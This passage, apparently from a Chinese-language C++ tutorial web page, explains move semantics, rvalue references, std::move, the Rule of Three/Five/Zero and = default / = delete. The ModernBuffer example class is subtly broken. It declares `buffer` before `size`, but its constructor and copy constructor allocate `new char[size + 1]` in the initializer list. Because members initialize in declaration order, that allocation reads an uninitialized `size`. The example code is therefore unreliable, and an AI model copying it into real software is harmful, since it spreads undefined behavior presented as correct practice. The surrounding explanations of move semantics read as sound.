class="line">&#125;</span><br></pre></td></tr></table></figure><p>在处理 <code>createBuffer</code> 返回的临时对象时，我们实际上只是想把临时对象内部管理的资源（<code>buffer</code> 指针和 <code>size</code>）<strong>转移</strong>给新的对象 (<code>b4</code> 或 <code>b1</code>)，因为临时对象马上就要被销毁了，它的资源没用了。进行深拷贝（重新分配内存并复制内容）是一种浪费。</p><p>移动语义就是为了解决这个问题：允许我们<strong>“窃取”</strong>或<strong>“移动”</strong>来自临时对象或明确标记为可移动对象的资源，而不是复制它们。</p><h3 id="右值引用-amp-amp"><a href="#右值引用-amp-amp" class="headerlink" title="右值引用 (&amp;&amp;)"></a>右值引用 (<code>&amp;&amp;</code>)</h3><p>为了区分可以安全“窃取”资源的临时对象和不能窃取的持久对象（左值），C++11 引入了**右值引用 (Rvalue Reference)**，用 <code>&amp;&amp;</code> 表示。</p><ul><li>  <strong>左值 (Lvalue):</strong> 通常指那些有名字、可以取地址、在表达式结束后仍然存在的对象。例如，变量名 <code>b1</code>, <code>b2</code>。</li><li>  <strong>右值 (Rvalue):</strong> 通常指那些临时的、没有名字、在表达式结束后即将销毁的值。例如，函数返回值 <code>createBuffer(&quot;Temporary&quot;)</code>，字面常量 <code>10</code>, <code>&quot;Hello&quot;</code>，算术表达式的结果 <code>x + y</code>。</li><li>  <strong>左值引用 (<code>&amp;</code>):</strong> 只能绑定到左值。<code>LegacyBuffer&amp; ref = b1;</code> (OK), <code>LegacyBuffer&amp; ref = createBuffer(&quot;Temp&quot;);</code> (错误!)。 (const 左值引用 <code>const LegacyBuffer&amp;</code> 是个例外，它可以绑定到右值)。</li><li>  <strong>右值引用 (<code>&amp;&amp;</code>):</strong> 只能绑定到右值。<code>LegacyBuffer&amp;&amp; rref = createBuffer(&quot;Temp&quot;);</code> (OK), <code>LegacyBuffer&amp;&amp; rref = b1;</code> (错误!)。</li></ul><p>右值引用 <code>&amp;&amp;</code> 的引入使得我们可以重载函数（特别是构造函数和赋值运算符），让它们能够区分接收的是左值还是右值，从而对右值（临时对象）采取不同的、更高效的操作（移动）。</p><h3 id="18-2-2-一个移动示例"><a href="#18-2-2-一个移动示例" class="headerlink" title="18.2.2 一个移动示例"></a>18.2.2 一个移动示例</h3><p>现在我们为 <code>LegacyBuffer</code> 类添加移动构造函数和移动赋值运算符。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utility&gt; // for std::move and std::swap</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ModernBuffer</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">char</span>* buffer;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// Constructor</span></span><br><span class="line">    ModernBuffer(<span class="keyword">const</span> <span class="keyword">char</span>* s = <span class="string">&quot;&quot;</span>) : size(<span class="built_in">std</span>::<span class="built_in">strlen</span>(s)), buffer(<span class="keyword">new</span> <span class="keyword">char</span>[size + <span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Constructor called for &#x27;&quot;</span> &lt;&lt; s &lt;&lt; <span class="string">&quot;&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">strcpy</span>(buffer, s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Destructor</span></span><br><span class="line">    ~ModernBuffer() &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Destructor called for buffer at &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Constructor (Deep Copy)</span></span><br><span class="line">    ModernBuffer(<span class="keyword">const</span> ModernBuffer&amp; other) : size(other.size), buffer(<span class="keyword">new</span> <span class="keyword">char</span>[size + <span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Copy Constructor called from &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)other.buffer &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">strcpy</span>(buffer, other.buffer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Copy Assignment Operator (Deep Copy)</span></span><br><span class="line">    ModernBuffer&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> ModernBuffer&amp; other) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Copy Assignment called from &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)other.buffer &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;other) &#123;</span><br><span class="line">            <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 使用 copy-and-swap idiom 更安全</span></span><br><span class="line">        <span class="function">ModernBuffer <span class="title">temp</span><span class="params">(other)</span></span>; <span class="comment">// 调用复制构造</span></span><br><span class="line">        swap(*<span class="keyword">this</span>, temp);        <span class="comment">// 交换资源</span></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        <span class="comment">// 旧方式：</span></span><br><span class="line">        <span class="comment">// delete[] buffer;</span></span><br><span class="line">        <span class="comment">// size = other.size;</span></span><br><span class="line">        <span class="comment">// buffer = new char[size + 1];</span></span><br><span class="line">        <span class="comment">// std::strcpy(buffer, other.buffer);</span></span><br><span class="line">        <span class="comment">// return *this;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// *** Move Constructor (C++11) ***</span></span><br><span class="line">    ModernBuffer(ModernBuffer&amp;&amp; other) <span class="keyword">noexcept</span> <span class="comment">// 接收右值引用，标记为 noexcept</span></span><br><span class="line">        : size(other.size), buffer(other.buffer) <span class="comment">// 1. 窃取资源 (浅拷贝指针和大小)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Move Constructor called from &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)other.buffer &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="comment">// 2. 将源对象置于有效但可析构的状态 (通常是置空)</span></span><br><span class="line">        other.size = <span class="number">0</span>;</span><br><span class="line">        other.buffer = <span class="literal">nullptr</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// *** Move Assignment Operator (C++11) ***</span></span><br><span class="line">    ModernBuffer&amp; <span class="keyword">operator</span>=(ModernBuffer&amp;&amp; other) <span class="keyword">noexcept</span> <span class="comment">// 接收右值引用，标记为 noexcept</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Move Assignment called from &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)other.buffer &lt;&lt; <span class="string">&quot; to &quot;</span> &lt;&lt; (<span class="keyword">void</span>*)buffer &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span> == &amp;other) &#123; <span class="comment">// 自赋值检查 (虽然对右值不太可能，但保持良好习惯)</span></span><br><span class="line">            <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 1. 释放当前对象的资源</span></span><br><span class="line">        <span class="keyword">delete</span>[] buffer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 窃取源对象的资源</span></span><br><span class="line">        size = other.size;</span><br><span class="line">        buffer = other.buffer;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 将源对象置于有效但可析构的状态</span></span><br><span class="line">        other.size = <span class="number">0</span>;</span><br><span class="line">        other.buffer = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">        <span class="comment">// 或者使用 swap:</span></span><br><span class="line">        <span class="comment">// swap(*this, other);</span></span><br><span class="line">        <span class="comment">// return *this;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Buffer content: &quot;</span> &lt;&lt; (buffer ? buffer : <span class="string">&quot;null&quot;</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">void</span> <span class="title">swap</span><span class="params">(ModernBuffer&amp; first, ModernBuffer&amp; second)</span> <span class="keyword">noexcept</span> </span>&#123;</span><br><span class="line">         <span class="keyword">using</span> <span class="built_in">std</span>::swap;</span><br><span class="line">         swap(first.size, second.size);</span><br><span class="line">         swap(first.buffer, second.buffer);</span><br><span class="line">         <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Buffer swapped via friend swap\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">ModernBuffer <span class="title">createModernBuffer</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ModernBuffer(s); <span class="comment">// 返回临时对象 (rvalue)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">ModernBuffer <span class="title">mb1</span><span class="params">(<span class="string">&quot;Original&quot;</span>)</span></span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用移动构造函数 (因为 createModernBuffer 返回右值)</span></span><br><span class="line">    ModernBuffer mb2 = createModernBuffer(<span class="string">&quot;Temporary&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line">    mb2.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用移动赋值运算符 (因为 createModernBuffer 返回右值)</span></span><br><span class="line">    mb1 = createModernBuffer(<span class="string">&quot;Another Temp&quot;</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line">    mb1.print();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;------\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在，当用 <code>createModernBuffer</code> 返回的临时对象来初始化 <code>mb2</code> 或赋值给 <code>mb1</code> 时，会调用<strong>移动构造函数</strong>或<strong>移动赋值运算符</strong>。这些操作不再进行深拷贝，而是直接“窃取”临时对象的 <code>buffer</code> 指针，并将临时对象的指针置为 <code>nullptr</code>，避免了内存分配和数据复制，效率大大提高。</p><h3 id="18-2-3-移动构造函数解析"><a href="#18-2-3-移动构造函数解析" class="headerlink" title="18.2.3 移动构造函数解析"></a>18.2.3 移动构造函数解析</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ModernBuffer(ModernBuffer&amp;&amp; other) <span class="keyword">noexcept</span></span><br><span class="line">    : size(other.size), buffer(other.buffer) <span class="comment">// 1. 窃取资源</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 2. 将源对象置空</span></span><br><span class="line">    other.size = <span class="number">0</span>;</span><br><span class="line">    other.buffer = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li> <strong>参数类型 <code>ModernBuffer&amp;&amp; other</code>:</strong> 接收一个右值引用，表示它只能绑定到右值（如临时对象）。</li><li> <strong>资源窃取:</strong> 构造函数通过初始化列表直接复制源对象 <code>other</code> 的指针 <code>buffer</code> 和大小 <code>size</code>。这是一个浅拷贝，非常快速。</li><li> <strong>置空源对象:</strong> <strong>关键步骤！</strong> 必须将源对象 <code>other</code> 的指针成员（<code>buffer</code>）设置为 <code>nullptr</code>（或其他有效但表示“空”状态的值）。这确保了当 <code>other</code>（临时对象）随后被析构时，它的析构函数 <code>delete[] buffer;</code> 不会释放已经被新对象“窃取”走的内存，从而避免了<strong>重复释放 (double free)</strong> 的错误。源对象必须被置于一个<strong>有效的、可析构的状态</strong>。</li><li> <strong><code>noexcept</code>:</strong> 移动操作通常<strong>不应该</strong>抛出异常（因为它们主要涉及指针和基本类型的赋值）。将移动构造函数和移动赋值运算符标记为 <code>noexcept</code> 非常重要。这允许 STL 容器等在需要重新分配内存时（如 <code>vector</code> 增长）安全地<strong>移动</strong>元素而不是复制它们，从而获得显著的性能提升。如果移动操作可能抛异常，STL 通常会回退到使用（保证异常安全的）复制操作。</li></ol><h3 id="18-2-4-赋值"><a href="#18-2-4-赋值" class="headerlink" title="18.2.4 赋值"></a>18.2.4 赋值</h3><p>移动赋值运算符的逻辑与移动构造函数类似：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ModernBuffer&amp; <span class="keyword">operator</span>=(ModernBuffer&amp;&amp; other) <span class="keyword">noexcept</span> &#123;</span><br><span class="line">    <span class="comment">// ... 自赋值检查 ...</span></span><br><span class="line">    <span class="comment">// 1. 释放当前资源</span></span><br><span class="line">    <span class="keyword">delete</span>[] buffer;</span><br><span class="line">    <span class="comment">// 2. 窃取源资源</span></span><br><span class="line">    size = other.size;</span><br><span class="line">    buffer = other.buffer;</span><br><span class="line">    <span class="comment">// 3. 置空源对象</span></span><br><span class="line">    other.size = <span class="number">0</span>;</span><br><span class="line">    other.buffer = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它首先释放自己当前持有的资源，然后窃取源对象的资源，最后将源对象置空。使用 <code>swap</code> 实现通常更简洁且能自动处理自赋值和异常安全（如果 <code>swap</code> 是 <code>noexcept</code> 的话）。</p><h3 id="18-2-5-强制移动-std-move"><a href="#18-2-5-强制移动-std-move" class="headerlink" title="18.2.5 强制移动 (std::move)"></a>18.2.5 强制移动 (<code>std::move</code>)</h3><p>移动构造函数和移动赋值运算符通常只对<strong>右值</strong>（如临时对象）起作用。但有时我们想从一个<strong>左值</strong>（有名字的对象）那里“窃取”资源，即使这个左值在之后还会存在（但我们明确知道不再需要它的资源了）。</p><p>例如，将一个大的 <code>vector</code> 的内容转移给另一个 <code>vector</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; source = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; destination;</span><br><span class="line"></span><br><span class="line"><span class="comment">// destination = source; // 这会调用复制赋值，复制所有元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 我们想移动 source 的内容到 destination，即使 source 是左值</span></span><br><span class="line"><span class="comment">// 使用 std::move() 将 source 强制转换为右值引用类型</span></span><br><span class="line">destination = <span class="built_in">std</span>::move(source);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 现在，destination 拥有了原来的元素 &#123;1, 2, 3, 4, 5&#125;</span></span><br><span class="line"><span class="comment">// source 的状态是有效的，但内容未指定 (通常为空)</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Source size after move: &quot;</span> &lt;&lt; source.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 通常输出 0</span></span><br></pre></td></tr></table></figure><p><code>std::move</code> (定义在 <code>&lt;utility&gt;</code>) 本身<strong>并不执行任何移动操作</strong>。它只是一个<strong>类型转换</strong>，它无条件地将其实参（无论是左值还是右值）转换为<strong>右值引用类型</strong> (<code>T&amp;&amp;</code>)。</p><p>这个转换使得被转换的对象可以被绑定到接受右值引用的函数（如移动构造函数或移动赋值运算符），从而<strong>触发</strong>移动语义。</p><p><strong>使用 <code>std::move</code> 的注意事项:</strong></p><ul><li>  调用 <code>std::move(x)</code> 后，你不应该再对 <code>x</code> 的值做任何假设（除了它可以被安全地销毁或重新赋值）。它的资源可能已经被“偷走”了。</li><li>  只在你确定不再需要源对象（左值）的资源，或者源对象本身就是临时的（虽然对临时对象用 <code>std::move</code> 通常是多余的）时，才使用 <code>std::move</code>。</li></ul><p>移动语义和右值引用是 C++11 中实现资源高效转移的关键机制，对于编写高性能的 C++ 代码至关重要，尤其是在处理大型数据结构或管理系统资源时。</p><h2 id="18-3-新的类功能"><a href="#18-3-新的类功能" class="headerlink" title="18.3 新的类功能"></a>18.3 新的类功能</h2><p>C++11 不仅引入了移动语义，还对类的定义和使用方式进行了一些重要的增强，使得类的设计更加灵活和可控。</p><h3 id="18-3-1-特殊的成员函数"><a href="#18-3-1-特殊的成员函数" class="headerlink" title="18.3.1 特殊的成员函数"></a>18.3.1 特殊的成员函数</h3><p>对于一个类，编译器在特定条件下可以自动生成一些特殊的成员函数：</p><ol><li> <strong>默认构造函数 (Default Constructor):</strong> 如果你没有提供任何构造函数，编译器会生成一个。</li><li> <strong>析构函数 (Destructor):</strong> 如果你没有提供析构函数，编译器会生成一个。</li><li> <strong>复制构造函数 (Copy Constructor):</strong> 如果你没有提供复制构造函数，编译器会生成一个，执行逐成员复制。</li><li> <strong>复制赋值运算符 (Copy Assignment Operator):</strong> 如果你没有提供复制赋值运算符，编译器会生成一个，执行逐成员赋值。</li><li> <strong>移动构造函数 (Move Constructor) (C++11):</strong> 仅当<strong>没有</strong>显式声明任何复制操作（复制构造、复制赋值）<strong>且没有</strong>显式声明移动操作（移动构造、移动赋值）<strong>且没有</strong>显式声明析构函数时，编译器才会生成。它执行逐成员移动。</li><li> <strong>移动赋值运算符 (Move Assignment Operator) (C++11):</strong> 生成条件与移动构造函数类似。它执行逐成员移动。</li></ol><p><strong>规则总结 (Rule of Three/Five/Zero):</strong></p><ul><li>  <strong>Rule of Three (C++98):</strong> 如果你需要显式定义析构函数、复制构造函数或复制赋值运算符中的<strong>任何一个</strong>（通常是因为类管理了需要深拷贝或特殊清理的资源），那么你<strong>几乎肯定</strong>需要同时定义这三个。</li><li>  <strong>Rule of Five (C++11):</strong> 如果你需要显式定义上述三个中的任何一个，或者显式定义了移动构造函数或移动赋值运算符，那么你应该考虑定义或删除 (delete) <strong>所有五个</strong>（析构、复制构造、复制赋值、移动构造、移动赋值），以确保类的行为符合预期。因为显式定义任何一个复制/移动/析构函数都会阻止编译器自动生成移动操作。</li><li>  <strong>Rule of Zero (现代 C++ 推荐):</strong> 尽量设计你的类，使其<strong>不需要</strong>自定义析构函数、复制/移动构造函数或复制/移动赋值运算符。这通常通过使用 RAII（资源获取即初始化）原则和依赖标准库组件（如智能指针 <code>unique_ptr</code>, <code>shared_ptr</code> 和容器 <code>vector</code>, <code>string</code>）来实现，这些组件已经正确地处理了资源的复制、移动和释放。如果遵循 Rule of Zero，编译器生成的默认版本通常就能正常工作。</li></ul><h3 id="18-3-2-默认的方法和禁用的方法-default-delete"><a href="#18-3-2-默认的方法和禁用的方法-default-delete" class="headerlink" title="18.3.2 默认的方法和禁用的方法 (= default, = delete)"></a>18.3.2 默认的方法和禁用的方法 (<code>= default</code>, <code>= delete</code>)</h3><p>C++11 允许你更明确地控制特殊成员函数的生成：</p><ul><li><p><strong><code>= default</code>:</strong> 显式地告诉编译器生成该特殊成员函数的<strong>默认实现</strong>。即使因为你定义了其他构造函数或移动操作而导致编译器原本不会生成它，<code>= default</code> 也可以强制生成默认版本（如果可能的话）。这对于希望拥有默认行为但又需要自定义其他构造函数的情况很有用。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClassDefault</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    MyClassDefault(<span class="keyword">int</span> val) : data(val) &#123;&#125; <span class="comment">// 自定义构造函数</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 即使定义了其他构造函数，仍显式要求编译器生成默认构造函数</span></span><br><span class="line">    MyClassDefault() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 显式要求编译器生成默认的复制构造函数</span></span><br><span class="line">    MyClassDefault(<span class="keyword">const</span> MyClassDefault&amp;) = <span class="keyword">default</span>;</span><br><span class="line">    <span class="comment">// ... 其他特殊成员函数也可以 = default</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>= delete</code>:</strong> 显式地<strong>禁用</strong>某个成员函数（可以是特殊成员函数，也可以是普通成员函数）。如果代码尝试调用被 <code>= delete</code> 的函数，编译器会报错。这常用于阻止对象的复制或防止不期望的类型转换。</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;memory&gt; // for unique_ptr</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NonCopyable</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    NonCopyable() = <span class="keyword">default</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 禁用复制构造函数</span></span><br><span class="line">    NonCopyable(<span class="keyword">const</span> NonCopyable&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    <span class="comment">// 禁用复制赋值运算符</span></span><br><span class="line">    NonCopyable&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> NonCopyable&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移动操作通常仍可默认生成或显式 default</span></span><br><span class="line">    NonCopyable(NonCopyable&amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line">    NonCopyable&amp; <span class="keyword">operator</span>=(NonCopyable&amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ResourceManager</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;<span class="keyword">int</span>&gt; ptr; <span class="comment">// unique_ptr 本身是不可复制的</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    ResourceManager(<span class="keyword">int</span> val) : ptr(<span class="built_in">std</span>::make_unique&lt;<span class="keyword">int</span>&gt;(val)) &#123;&#125;</span><br><span class="line">    <span class="comment">// 由于 unique_ptr 不可复制，编译器不会生成默认的复制操作</span></span><br><span class="line">    <span class="comment">// 我们可以显式禁用它们，使意图更明确</span></span><br><span class="line">    ResourceManager(<span class="keyword">const</span> ResourceManager&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">    ResourceManager&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> ResourceManager&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 移动操作是允许的 (unique_ptr 可移动)</span></span><br><span class="line">    ResourceManager(ResourceManager&amp;&amp;) = <span class="keyword">default</span>;</span><br><span class="line">    